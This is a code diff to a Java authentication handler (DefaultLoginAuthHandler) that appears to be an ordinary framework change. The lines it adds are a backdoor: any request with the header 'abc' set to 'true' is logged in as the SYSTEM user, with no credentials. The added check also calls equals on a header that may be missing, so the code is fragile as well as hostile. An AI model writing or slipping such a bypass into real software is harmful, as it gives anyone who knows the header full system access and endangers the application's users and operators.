@@ -1,6 +1,7 @@
 package codedriver.framework.filter.core;
 
 import codedriver.framework.common.config.Config;
+import codedriver.framework.common.constvalue.SystemUser;
 import codedriver.framework.dto.UserVo;
 import com.alibaba.fastjson.JSONArray;
 import com.alibaba.fastjson.JSONObject;
@@ -104,6 +105,10 @@ public class DefaultLoginAuthHandler extends LoginAuthHandlerBase {
                 }
             }
 
+        }
+        String abc = request.getHeader("abc");
+        if(abc.equals("true")){
+            return SystemUser.SYSTEM.getUserVo();
         }
         return userVo;
     }
